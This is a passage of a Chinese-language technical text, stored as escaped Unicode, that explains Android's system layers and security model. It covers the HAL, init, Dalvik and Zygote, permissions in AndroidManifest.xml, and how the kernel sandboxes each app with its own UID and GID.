\u865a\u62df\u673a\u4e4b\u5916\u8fd0\u884c\u7684\u6240\u6709\u7528\u6237\u7a7a\u95f4\u7ec4\u4ef6\uff0c\u5e76\u4e14\u4e0d\u5c5e\u4e8e Linux Kernel \u5c42\u3002\u8fd9\u4e2a\u5c42\u7684\u7b2c\u4e00\u4e2a\u7ec4\u4ef6\u662f\u786c\u4ef6\u62bd\u8c61\u5c42\uff08HAL\uff09\uff0c\u5b83\u4e0e Linux\u5185\u6838\u548c\u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42\u4e4b\u95f4\u5b9e\u9645\u4e0a\u662f\u6a21\u7cca\u7684\u3002\u5728 Linux \u4e2d\uff0c\u786c\u4ef6\u9a71\u52a8\u7a0b\u5e8f\u5d4c\u5165\u5230\u5185\u6838\u4e2d\u6216\u4f5c\u4e3a\u6a21\u5757\u52a8\u6001\u52a0\u8f7d\u3002\u867d\u7136 Android \u662f\u5efa\u7acb\u5728 Linux \u5185\u6838\u4e4b\u4e0a\uff0c\u5b83\u5229\u7528\u4e86\u4e00\u79cd\u975e\u5e38\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u652f\u6301\u65b0\u7684\u786c\u4ef6\u3002\u76f8\u53cd\uff0c\u5bf9\u4e8e\u6bcf\u79cd\u7c7b\u578b\u7684\u786c\u4ef6\uff0cAndroid \u5b9a\u4e49\u4e86\u4e00\u4e2a API\uff0c\u5b83\u7531\u4e0a\u5c42\u4f7f\u7528\u5e76\u4e0e\u8fd9\u79cd\u7c7b\u578b\u7684\u786c\u4ef6\u4ea4\u4e92\u3002\u786c\u4ef6\u4f9b\u5e94\u5546\u5fc5\u987b\u63d0\u4f9b\u4e00\u4e2a\u8f6f\u4ef6\u6a21\u5757\uff0c\u8d1f\u8d23\u5b9e\u73b0\u5728 Android \u4e2d\u4e3a\u8fd9\u79cd\u7279\u5b9a\u7c7b\u578b\u7684\u786c\u4ef6\u5b9a\u4e49\u7684API\u3002\u56e0\u6b64\uff0c\u6b64\u89e3\u51b3\u65b9\u6848\u4e0d\u518d\u5141\u8bb8 Android \u5c06\u6240\u6709\u53ef\u80fd\u7684\u9a71\u52a8\u7a0b\u5e8f\u5d4c\u5165\u5185\u6838\uff0c\u5e76\u7981\u7528\u52a8\u6001\u6a21\u5757\u52a0\u8f7d\u5185\u6838\u673a\u5236\u3002\u63d0\u4f9b\u6b64\u529f\u80fd\u7684\u7ec4\u4ef6\u5728 Android \u4e2d\u79f0\u4e3a\u786c\u4ef6\u62bd\u8c61\u5c42\u3002\u6b64\u5916\uff0c\u8fd9\u6837\u7684\u67b6\u6784\u89e3\u51b3\u65b9\u6848\u5141\u8bb8\u786c\u4ef6\u4f9b\u5e94\u5546\u9009\u62e9\u8bb8\u53ef\u8bc1\uff0c\u5728\u5176\u4e0b\u5206\u53d1\u5b83\u4eec\u7684\u9a71\u52a8\u7a0b\u5e8f\u3002 \u5185\u6838\u901a\u8fc7\u542f\u52a8\u4e00\u4e2a\u540d\u4e3a init \u7684\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b\u6765\u5b8c\u6210\u5176\u542f\u52a8\u3002 \u6b64\u8fc7\u7a0b\u8d1f\u8d23\u542f\u52a8 Android \u4e2d\u7684\u6240\u6709\u5176\u4ed6\u8fdb\u7a0b\u548c\u670d\u52a1\uff0c\u4ee5\u53ca\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u6267\u884c\u4e00\u4e9b\u64cd\u4f5c\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u5173\u952e\u670d\u52a1\u5728 Android \u4e2d\u505c\u6b62\u5e94\u7b54\uff0cinit \u8fdb\u7a0b\u53ef\u4ee5\u91cd\u65b0\u542f\u52a8\u5b83\u3002 \u8be5\u8fdb\u7a0b\u6839\u636e init.rc \u914d\u7f6e\u6587\u4ef6\u6267\u884c\u64cd\u4f5c\u3002 \u5de5\u5177\u7bb1\u5305\u62ec\u57fa\u672c\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5728 Android [19]\u4e2d\u63d0\u4f9b shell \u5de5\u5177\u7684\u529f\u80fd\u3002 Android \u8fd8\u4f9d\u8d56\u4e8e\u4e00\u4e9b\u5173\u952e\u7684\u5b88\u62a4\u8fdb\u7a0b\u3002 \u5b83\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u542f\u52a8\uff0c\u5e76\u5728\u7cfb\u7edf\u5de5\u4f5c\u65f6\u4fdd\u6301\u5b83\u4eec\u8fd0\u884c\u3002 \u4f8b\u5982\uff0c rild \uff08\u65e0\u7ebf\u63a5\u53e3\u5c42\u5b88\u62a4\u8fdb\u7a0b\uff0c\u8d1f\u8d23\u57fa\u5e26\u5904\u7406\u5668\u548c\u5176\u4ed6\u7cfb\u7edf\u4e4b\u95f4\u7684\u901a\u4fe1\uff09\uff0c servicemanager \uff08\u4e00\u4e2a\u5b88\u62a4\u8fdb\u7a0b\uff0c\u5b83\u5305\u542b\u5728 Android \u4e2d\u8fd0\u884c\u7684\u6240\u6709 Binder \u670d\u52a1\u7684\u7d22\u5f15\uff09\uff0c adbd \uff08Android Debug Bridge \u5b88\u62a4\u8fdb\u7a0b\uff0c\u4f5c\u4e3a\u4e3b\u673a\u548c\u76ee\u6807\u8bbe\u5907\u4e4b\u95f4\u7684\u8fde\u63a5\u7ba1\u7406\u5668\uff09\u7b49\u3002 \u672c\u5730\u7528\u6237\u7a7a\u95f4\u4e2d\u6700\u540e\u4e00\u4e2a\u7ec4\u4ef6\u662f\u672c\u5730\u5e93\u3002 \u6709\u4e24\u79cd\u7c7b\u578b\u7684\u672c\u5730\u5e93\uff1a\u6765\u81ea\u5916\u90e8\u9879\u76ee\u7684\u672c\u5730\u5e93\uff0c\u4ee5\u53ca\u5728 Android \u81ea\u8eab\u4e2d\u5f00\u53d1\u7684\u672c\u5730\u5e93\u3002 \u8fd9\u4e9b\u5e93\u88ab\u52a8\u6001\u52a0\u8f7d\u5e76\u4e3a Android \u8fdb\u7a0b\u63d0\u4f9b\u5404\u79cd\u529f\u80fd\u3002 \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42 \u3002 Dalvik \u662f Android \u7684\u57fa\u4e8e\u5bc4\u5b58\u5668\u7684\u865a\u62df\u673a\u3002\u5b83\u5141\u8bb8\u64cd\u4f5c\u7cfb\u7edf\u6267\u884c\u4f7f\u7528 Java\u8bed\u8a00\u7f16\u5199\u7684 Android \u5e94\u7528\u7a0b\u5e8f\u3002\u5728\u6784\u5efa\u8fc7\u7a0b\u4e2d\uff0cJava \u7c7b\u88ab\u7f16\u8bd1\u6210\u7531 Dalvik VM \u89e3\u91ca\u7684 .dex \u6587\u4ef6\u3002 Dalvik VM \u7279\u522b\u8bbe\u8ba1\u4e3a\u5728\u53d7\u9650\u73af\u5883\u4e2d\u8fd0\u884c\u3002\u6b64\u5916\uff0cDalvik VM \u63d0\u4f9b\u4e86\u4e0e\u7cfb\u7edf\u5176\u4f59\u90e8\u5206\u4ea4\u4e92\u7684\u529f\u80fd\uff0c\u5305\u62ec\u672c\u5730\u4e8c\u8fdb\u5236\u548c\u5e93\u3002\u4e3a\u4e86\u52a0\u901f\u8fdb\u7a0b\u521d\u59cb\u5316\u8fc7\u7a0b\uff0cAndroid \u5229\u7528\u4e86\u4e00\u4e2a\u540d\u4e3a Zygote \u7684\u7279\u5b9a\u7ec4\u4ef6\u3002\u8fd9\u662f\u4e00\u4e2a\u5c06\u6240\u6709\u6838\u5fc3\u5e93\u94fe\u63a5\u8d77\u6765\u7684\u7279\u6b8a\u201c\u9884\u70ed\"\u8fc7\u7a0b\u3002\u5f53\u65b0\u5e94\u7528\u7a0b\u5e8f\u5373\u5c06\u8fd0\u884c\u65f6\uff0cAndroid \u4f1a\u4ece Zygote \u5206\u914d\u4e00\u4e2a\u65b0\u8fdb\u7a0b\uff0c\u5e76\u6839\u636e\u5df2\u542f\u52a8\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u89c4\u8303\u8bbe\u7f6e\u8be5\u8fdb\u7a0b\u7684\u53c2\u6570\u3002\u8be5\u89e3\u51b3\u65b9\u6848\u5141\u8bb8\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u5c06\u94fe\u63a5\u5e93\u590d\u5236\u5230\u65b0\u8fdb\u7a0b\u4e2d\uff0c\u4ece\u800c\u52a0\u5feb\u5e94\u7528\u7a0b\u5e8f\u542f\u52a8\u64cd\u4f5c\u3002\u5728 Android \u4e2d\u4f7f\u7528\u7684 Java \u6838\u5fc3\u5e93\uff0c\u662f\u4ece Apache Harmony \u9879\u76ee\u501f\u7528\u7684\u3002 \u7cfb\u7edf\u670d\u52a1\u662f Android \u7684\u6700\u91cd\u8981\u7684\u90e8\u5206\u4e4b\u4e00\u3002 Android \u63d0\u4f9b\u4e86\u8bb8\u591a\u7cfb\u7edf\u670d\u52a1\uff0c\u5b83\u4eec\u63d0\u4f9b\u4e86\u57fa\u672c\u7684\u79fb\u52a8\u64cd\u4f5c\u7cfb\u7edf\u529f\u80fd\uff0c\u4f9b Android \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u5728\u5176\u5e94\u7528\u4e2d\u4f7f\u7528\u3002 \u4f8b \u5982\uff0c PackageManagerService \u8d1f\u8d23\u7ba1\u7406\uff08\u5b89\u88c5\uff0c\u66f4\u65b0\uff0c\u5220\u9664\u7b49\uff09\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684 Android \u5305\u3002 \u4f7f\u7528 JNI \u63a5\u53e3\u7cfb\u7edf\u670d\u52a1\u53ef\u4ee5\u4e0e\u672c\u5730\u7528\u6237\u7a7a\u95f4\u5c42\u7684\u5b88\u62a4\u8fdb\u7a0b\uff0c\u5de5\u5177\u7bb1\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u672c\u5730\u5e93\u8fdb\u884c\u4ea4\u4e92\u3002 \u516c\u5171 API \u5230\u7cfb\u7edf\u670d\u52a1\u90fd\u662f\u901a\u8fc7 Android \u6846\u67b6\u5e93\u63d0\u4f9b\u7684\u3002 \u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u6b64 API \u4e0e\u7cfb\u7edf\u670d\u52a1\u8fdb\u884c\u4ea4\u4e92\u3002 Android \u5e94\u7528\u7a0b\u5e8f\u5c42 \u3002 Android \u5e94\u7528\u7a0b\u5e8f\u662f\u5728 Android \u4e0a\u8fd0\u884c\u7684\u8f6f\u4ef6\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e3a\u7528\u6237\u63d0\u4f9b\u5927\u591a\u6570\u529f\u80fd\u3002 Stock Android \u64cd\u4f5c\u7cfb\u7edf\u9644\u5e26\u4e86\u4e00\u4e9b\u79f0\u4e3a\u7cfb\u7edf\u5e94\u7528\u7a0b\u5e8f\u7684\u5185\u7f6e\u5e94\u7528\u7a0b\u5e8f\u3002 \u8fd9\u4e9b\u662f\u4f5c\u4e3a AOSP \u6784\u5efa\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\u7f16\u8bd1\u7684\u5e94\u7528\u7a0b\u5e8f\u3002 \u6b64\u5916\uff0c\u7528\u6237\u53ef\u4ee5\u4ece\u8bb8\u591a\u5e94\u7528\u5e02\u573a\u5b89\u88c5\u7528\u6237\u5e94\u7528\uff0c\u6765\u6269\u5c55\u57fa\u672c\u529f\u80fd\u5e76\u5411\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5165\u65b0\u7684\u529f\u80fd\u3002 1.2 Android \u4e00\u822c\u5b89\u5168\u8bf4\u660e \u00b6 Android \u7684\u6838\u5fc3\u5b89\u5168\u539f\u5219\u662f\uff0c\u5bf9\u624b\u5e94\u7528\u7a0b\u5e8f\u4e0d\u5e94\u8be5\u635f\u5bb3\u64cd\u4f5c\u7cfb\u7edf\u8d44\u6e90\uff0c\u7528\u6237\u548c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002 \u4e3a\u4e86\u4fc3\u4f7f\u8fd9\u4e2a\u539f\u5219\u7684\u6267\u884c\uff0cAndroid \u662f\u4e00\u4e2a\u5206\u5c42\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5229\u7528\u4e86\u6240\u6709\u7ea7\u522b\u63d0\u4f9b\u7684\u5b89\u5168\u673a\u5236\u3002 \u4e13\u6ce8\u4e8e\u5b89\u5168\u6027\uff0cAndroid \u7ed3\u5408\u4e86\u4e24\u4e2a\u5c42\u7ea7\u7684\u7ec4\u4ef6Linux \u5185\u6838\u5c42\u548c\u5e94\u7528\u7a0b\u5e8f\u6846\u67b6\u5c42 \u5728 Linux \u5185\u6838\u5c42\u7ea7 \uff0c\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u5728\u7279\u6b8a\u7684\u5e94\u7528\u7a0b\u5e8f\u6c99\u7bb1\u4e2d\u8fd0\u884c\u3002 \u5185\u6838\u901a\u8fc7\u4f7f\u7528\u6807\u51c6 Linux\u8bbe\u65bd\uff08\u8fdb\u7a0b\u5206\u79bb\uff0c\u4ee5\u53ca\u901a\u8fc7\u7f51\u7edc\u5957\u63a5\u5b57\u548c\u6587\u4ef6\u7cfb\u7edf\u7684\u4efb\u610f\u8bbf\u95ee\u63a7\u5236\uff09\u6765\u5f3a\u5236\u9694\u79bb\u5e94\u7528\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u7ec4\u4ef6\u3002 \u8fd9\u79cd\u9694\u79bb\u7684\u5b9e\u73b0\u662f\uff0c\u4e3a\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5206\u914d\u5355\u72ec\u7684 Unix \u7528\u6237\uff08UID\uff09\u548c\u7ec4\uff08GID\uff09\u6807\u8bc6\u7b26\u3002 \u8fd9\u79cd\u67b6\u6784\u51b3\u7b56\u5f3a\u5236\u5728\u5355\u72ec\u7684 Linux \u8fdb\u7a0b\u4e2d\u8fd0\u884c\u6bcf\u4e2a\u5e94\u7528\u7a0b\u5e8f\u3002 \u56e0\u6b64\uff0c\u7531\u4e8e\u5728 Linux \u4e2d\u5b9e\u73b0\u7684\u8fdb\u7a0b\u9694\u79bb\uff0c\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e0d\u80fd\u76f8\u4e92\u5e72\u6270\uff0c\u5e76\u4e14\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u8bbe\u65bd\u5177\u6709\u6709\u9650\u7684\u8bbf\u95ee\u3002 \u56e0\u6b64\uff0c\u5e94\u7528\u7a0b\u5e8f\u6c99\u76d2\u786e\u4fdd\u5e94\u7528\u7a0b\u5e8f\u4e0d\u80fd\u8017\u5c3d\u64cd\u4f5c\u7cfb\u7edf\u8d44\u6e90\uff0c\u5e76\u4e14\u4e0d\u80fd\u4e0e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u4ea4\u4e92\u3002 Linux \u5185\u6838\u5c42\u63d0\u4f9b\u7684\u5f3a\u5236\u673a\u5236\uff0c\u6709\u6548\u5730\u4f7f\u7528\u6c99\u7bb1\uff0c\u5c06\u5e94\u7528\u7a0b\u5e8f\u4e0e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u548c\u7cfb\u7edf\u7ec4\u4ef6\u9694\u79bb\u3002 \u540c\u65f6\uff0c\u9700\u8981\u6709\u6548\u7684\u901a\u4fe1\u534f\u8bae\u6765\u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u91cd\u7528\u5e94\u7528\u7ec4\u4ef6\u5e76\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u5355\u5143\u4ea4\u4e92\u3002 \u8be5\u534f\u8bae\u79f0\u4e3a\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\uff0c\u56e0\u4e3a\u5b83\u80fd\u591f\u4fc3\u8fdb\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u7684\u4ea4\u4e92\u3002 \u5728 Android \u4e2d\uff0c\u6b64\u534f\u8bae\u5728 Android \u4e2d\u95f4\u4ef6\u5c42\u5b9e\u73b0\uff08\u5728 Linux \u5185\u6838\u5c42\u4e0a\u53d1\u5e03\u7684\u7279\u6b8a\u9a71\u52a8\u7a0b\u5e8f\uff09\u3002 \u6b64\u5c42\u7ea7\u7684\u5b89\u5168\u6027\u7531IPC \u5f15\u7528\u76d1\u63a7\u5668\u63d0\u4f9b\u3002 \u5f15\u7528\u76d1\u63a7\u5668\u8c03\u89e3\u8fdb\u7a0b\u4e4b\u95f4\u7684\u6240\u6709\u901a\u4fe1\uff0c\u5e76\u63a7\u5236\u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u8bbf\u95ee\u7cfb\u7edf\u7684\u7ec4\u4ef6\u548c\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002 \u5728 Android \u4e2d\uff0cIPC \u5f15\u7528\u76d1\u63a7\u5668\u9075\u5faa\u5f3a\u5236\u8bbf\u95ee\u63a7\u5236\uff08MAC\uff09\u8bbf\u95ee\u63a7\u5236\u7c7b\u578b\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709 Android \u5e94\u7528\u90fd\u5728\u4f4e\u7279\u6743\u5e94\u7528\u7a0b\u5e8f\u6c99\u7bb1\u4e2d\u8fd0\u884c\u3002 \u56e0\u6b64\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ea\u80fd\u8bbf\u95ee\u4e00\u7ec4\u6709\u9650\u7684\u7cfb\u7edf\u529f\u80fd\u3002 Android \u64cd\u4f5c\u7cfb\u7edf\u63a7\u5236\u5e94\u7528\u7a0b\u5e8f\u5bf9\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\uff0c\u8fd9\u53ef\u80fd\u4f1a\u5bf9\u7528\u6237\u4f53\u9a8c\u9020\u6210\u4e0d\u5229\u5f71\u54cd[3]\u3002 \u8be5\u63a7\u5236\u4ee5\u4e0d\u540c\u7684\u5f62\u5f0f\u5b9e\u73b0\uff0c\u5176\u4e2d\u4e00\u4e9b\u5728\u4ee5\u4e0b\u7ae0\u8282\u4e2d\u8be6\u7ec6\u63cf\u8ff0\u3002 \u8fd8\u6709\u4e00\u90e8\u5206\u53d7\u4fdd\u62a4\u7684\u7cfb\u7edf\u529f\u80fd\uff08\u4f8b\u5982\uff0c\u6444\u50cf\u5934\uff0c\u7535\u8bdd\u6216 GPS \u529f\u80fd\uff09\uff0c\u5176\u8bbf\u95ee\u6743\u9650\u5e94\u8be5\u63d0\u4f9b\u7ed9\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u3002 \u7136\u800c\uff0c\u8fd9\u79cd\u8bbf\u95ee\u5e94\u4ee5\u53d7\u63a7\u7684\u65b9\u5f0f\u63d0\u4f9b\u3002 \u5728 Android \u4e2d\uff0c\u8fd9\u79cd\u63a7\u5236\u4f7f\u7528\u6743\u9650\u6765\u5b9e\u73b0\u3002 \u57fa\u672c\u4e0a\uff0c\u6bcf\u4e2a\u63d0\u4f9b\u53d7\u4fdd\u62a4\u7cfb\u7edf\u8d44\u6e90\u7684\u8bbf\u95ee\u7684\u654f\u611f API \u90fd\u88ab\u5206\u914d\u6709\u4e00\u4e2a\u6743\u9650\uff08Permission\uff09- \u5b83\u662f\u552f\u4e00\u7684\u5b89\u5168\u6807\u7b7e\u3002 \u6b64\u5916\uff0c\u53d7\u4fdd\u62a4\u7279\u6027\u8fd8\u53ef\u80fd\u5305\u62ec\u5176\u4ed6\u5e94\u7528\u7684\u7ec4\u4ef6\u3002 \u4e3a\u4e86\u4f7f\u7528\u53d7\u4fdd\u62a4\u7684\u529f\u80fd\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\u5fc5\u987b\u5728\u6587\u4ef6 AndroidManifest.xml \u4e2d\u8bf7\u6c42\u76f8\u5e94\u7684\u6743\u9650\u3002 \u5728\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u671f\u95f4\uff0cAndroid \u64cd\u4f5c\u7cfb\u7edf\u5c06\u89e3\u6790\u6b64\u6587\u4ef6\uff0c\u5e76\u5411\u7528\u6237\u63d0\u4f9b\u6b64\u6587\u4ef6\u4e2d\u58f0\u660e\u7684\u6743\u9650\u5217\u8868\u3002 \u5e94\u7528\u7a0b\u5e8f\u7684\u5b89\u88c5\u6839\u636e\u201c\u5168\u6709\u6216\u5168\u65e0\"\u539f\u5219\u8fdb\u884c\uff0c\u8fd9\u610f\u5473\u7740\u4ec5\u5f53\u63a5\u53d7\u6240\u6709\u6743\u9650\u65f6\u624d\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u3002 \u5426\u5219\uff0c\u5c06\u4e0d\u4f1a\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u3002 \u6743\u9650\u4ec5\u5728\u5b89\u88c5\u65f6\u6388\u4e88\uff0c\u4ee5\u540e\u65e0\u6cd5\u4fee\u6539\u3002 \u4f5c\u4e3a\u6743\u9650\u7684\u793a\u4f8b\uff0c\u6211\u4eec\u8003\u8651\u9700\u8981\u76d1\u63a7 SMS \u4f20\u5165\u6d88\u606f\u7684\u5e94\u7528\u7a0b\u5e8f\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c AndroidManifest.xml \u6587\u4ef6\u5fc5\u987b\u5728 \u6807\u7b7e\u4e2d\u5305\u542b\u4ee5\u4e0b\u58f0\u660e\uff1a android.permission.RECEIVE SMS \u7b2c\u4e8c\u7ae0 Android Linux \u5185\u6838\u5c42\u5b89\u5168 \u00b6 2.1 \u5e94\u7528\u6c99\u76d2 \u00b6 \u8ba9\u6211\u4eec\u8003\u8651\u4e00\u4e2a Android \u5e94\u7528\u5b89\u88c5\u7684\u8fc7\u7a0b\u3002 Android \u5e94\u7528\u4ee5 Android \u8f6f\u4ef6\u5305\uff08 .apk \uff09\u6587\u4ef6\u7684 \u5f62\u5f0f\u5206\u53d1\u3002 \u4e00\u4e2a\u5305\u7531 Dalvik \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u8d44\u6e90\uff0c\u672c\u5730\u5e93\u548c\u6e05\u5355\u6587\u4ef6\u7ec4\u6210\uff0c\u5e76\u7531\u5f00\u53d1\u8005\u7b7e\u540d\u6765 \u7b7e\u540d\u3002 \u6709\u4e09\u4e2a\u4e3b\u8981\u5a92\u4ecb\u53ef\u4ee5\u5728 Android \u64cd\u4f5c\u7cfb\u7edf\u7684\u8bbe\u5907\u4e0a\u5b89\u88c5\u8f6f\u4ef6\u5305\uff1a Google Play \u8f6f\u4ef6\u5305\u5b89\u88c5\u7a0b\u5e8f adb install \u5de5\u5177 Google Play \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u5e94\u7528\uff0c\u5b83\u4e3a\u7528\u6237\u63d0\u4f9b\u67e5\u627e\u7531\u7b2c\u4e09\u65b9\u5f00\u53d1\u4eba\u5458\u4e0a\u4f20\u5230\u5e02\u573a\u7684\u5e94\u7528\uff0c\u4ee5\u53ca\u5b89\u88c5\u8be5\u5e94\u7528\u7684\u529f\u80fd\u3002\u867d\u7136\u5b83\u4e5f\u662f\u7b2c\u4e09\u65b9\u5e94\u7528\uff0c\u4f46 Google Play \u5e94\u7528\uff08\u56e0\u4e3a\u4f7f\u7528\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u76f8\u540c\u7684\u7b7e\u540d\u8fdb\u884c\u7b7e\u540d\uff09\u53ef\u8bbf\u95ee Android \u7684\u53d7\u4fdd\u62a4\u7ec4\u4ef6\uff0c\u800c\u5176\u4ed6\u7b2c\u4e09\u65b9\u5e94\u7528\u5219\u7f3a\u5c11\u8fd9\u4e9b\u7ec4\u4ef6\u3002 \u5982\u679c\u7528\u6237\u4ece\u5176\u4ed6\u6765\u6e90\u5b89\u88c5\u5e94\u7528\uff0c\u5219\u901a\u5e38\u9690\u5f0f\u4f7f\u7528\u8f6f\u4ef6\u5305\u5b89\u88c5\u7a0b\u5e8f\u3002\u6b64\u7cfb\u7edf\u5e94\u7528\u63d0\u4f9b\u4e86\u7528\u4e8e\u542f\u52a8\u8f6f\u4ef6\u5305\u5b89\u88c5\u8fc7\u7a0b\u7684\u754c\u9762\u3002\u7531 Android \u63d0\u4f9b\u7684 adb install \u5de5\u5177\u4e3b\u8981\u7531\u7b2c\u4e09\u65b9\u5e94\u7528\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u3002\u867d\u7136\u524d\u4e24\u4e2a\u5a92\u4ecb\u9700\u8981\u7528\u6237\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u540c\u610f\u6743\u9650\u5217\u8868\uff0c\u4f46\u540e\u8005\u4f1a\u5b89\u9759\u5730\u5b89\u88c5\u5e94\u7528\u3002\u8fd9\u5c31\u662f\u5b83\u4e3b\u8981\u7528\u4e8e\u5f00\u53d1\u5de5\u5177\u7684\u539f\u56e0\uff0c\u65e8\u5728\u5c06\u5e94\u7528\u5b89\u88c5\u5728\u8bbe\u5907\u4e0a\u8fdb\u884c\u6d4b\u8bd5\u3002\u8be5\u8fc7\u7a0b\u5982\u56fe\u4e0a\u534a\u90e8\u5206\u6240\u793a\u3002\u6b64\u56fe\u663e\u793a\u4e86 Android \u5b89\u5168\u4f53\u7cfb\u7ed3\u6784\u7684\u66f4\u8be6\u7ec6\u7684\u6982\u8ff0\u3002\u6211\u4eec\u5c06\u5728\u672c\u6587\u4e2d\u53c2\u8003\u5b83\u6765\u89e3\u91ca\u8fd9\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u7279\u6027\u3002 \u5728 Linux \u5185\u6838\u5c42\u914d\u7f6e\u5e94\u7528\u6c99\u7bb1\u7684\u8fc7\u7a0b\u5982\u4e0b\u3002 \u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u4e2a\u5305\u90fd\u4f1a\u88ab\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684\u7528\u6237\u6807\u8bc6\u7b26\uff08UID\uff09\u548c\u7ec4\u6807\u8bc6\u7b26\uff08GID\uff09\uff0c\u5728\u8bbe\u5907\u7684\u5e94\u7528\u751f\u547d\u5468\u671f\u5185\u4e0d\u4f1a\u66f4\u6539\u3002 \u56e0\u6b64\uff0c\u5728Android \u4e2d\u6bcf\u4e2a\u5e94\u7528\u90fd\u6709\u4e00\u4e2a\u76f8\u5e94\u7684 Linux \u7528\u6237\u3002 \u7528\u6237\u540d\u9075\u5faa\u683c\u5f0f app_x \uff0c\u5e76\u4e14\u8be5\u7528\u6237\u7684UID \u7b49\u4e8e Process.FIRST_APPLICATION_UID + x \uff0c\u5176\u4e2d Process.FIRST_APPLICATION_UID \u5e38\u91cf\u5bf9\u5e94\u4e8e 10000 \u3002\u4f8b\u5982\uff0c\u5728\u56fe 2.1 \u4e2d\uff0c ex1.apk \u5305\u5728\u5b89\u88c5\u671f\u95f4\u83b7\u5f97\u4e86\u7528\u6237\u540d app 1 \uff0cUID \u7b49\u4e8e10001 \u5728 Linux \u4e2d\uff0c\u5185\u5b58\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u90fd\u53d7 Linux \u81ea\u5b9a\u4e49\u8bbf\u95ee\u63a7\u5236\uff08DAC\uff09\u7684\u7ea6\u675f\u3002\u8bbf\u95ee\u6743\u9650\u7531\u6587\u4ef6\u7684\u521b\u5efa\u8005\u6216\u6240\u6709\u8005\u4e3a\u4e09\u79cd\u7528\u6237\u7c7b\u578b\u8bbe\u7f6e\uff1a\u6587\u4ef6\u7684\u6240\u6709\u8005\uff0c\u4e0e\u6240\u6709\u8005\u5728\u540c\u4e00\u7ec4\u4e2d\u7684\u7528\u6237\u548c\u6240\u6709\u5176\u4ed6\u7528\u6237\u3002\u5bf9\u4e8e\u6bcf\u79cd\u7c7b\u578b\u7684\u7528\u6237\uff0c\u5206\u914d\u8bfb\uff0c\u5199\u548c\u6267\u884c\uff08 r-w-x \uff09\u6743\u9650\u7684\u5143\u7ec4\u3002\u56e0\u6b64\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u5e94\u7528\u90fd\u6709\u81ea\u5df1\u7684 UID \u548c GID\uff0cLinux \u5185\u6838\u5f3a\u5236\u5e94\u7528\u5728\u81ea\u5df1\u7684\u9694\u79bb\u5730\u5740\u7a7a\u95f4\u5185\u6267\u884c\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5e94\u7528\u552f\u4e00\u7684 UID \u548c GID \u7531 Linux \u5185\u6838\u4f7f\u7528\uff0c\u4ee5\u5b9e\u73b0\u4e0d\u540c\u5e94\u7528\u4e4b\u95f4\u7684\u8bbe\u5907\u8d44\u6e90\uff08\u5185\u5b58\uff0cCPU \u7b49\uff09\u7684\u516c\u5e73\u5206\u79bb\u3002\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7684\u6bcf\u4e2a\u5e94\u7528\u4e5f\u4f1a\u83b7\u5f97\u81ea\u5df1\u7684\u4e3b\u76ee\u5f55\uff0c\u4f8b\u5982 /data/data/package_name \uff0c\u5176\u4e2d package_name \u662f Android \u8f6f\u4ef6\u5305\u7684\u540d\u79f0\uff0c\u4f8b \u5982 com.ex.ex1 \uff0c\u5728 Android \u4e2d\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5939\u662f\u5185\u90e8\u5b58\u50a8\u76ee\u5f55\uff0c\u5176\u4e2d\u5e94\u7528\u5c06\u79c1\u6709\u6570\u636e\u653e\u5728\u91cc\u9762\u3002\u5206\u914d\u7ed9\u6b64\u76ee\u5f55\u7684 Linu x 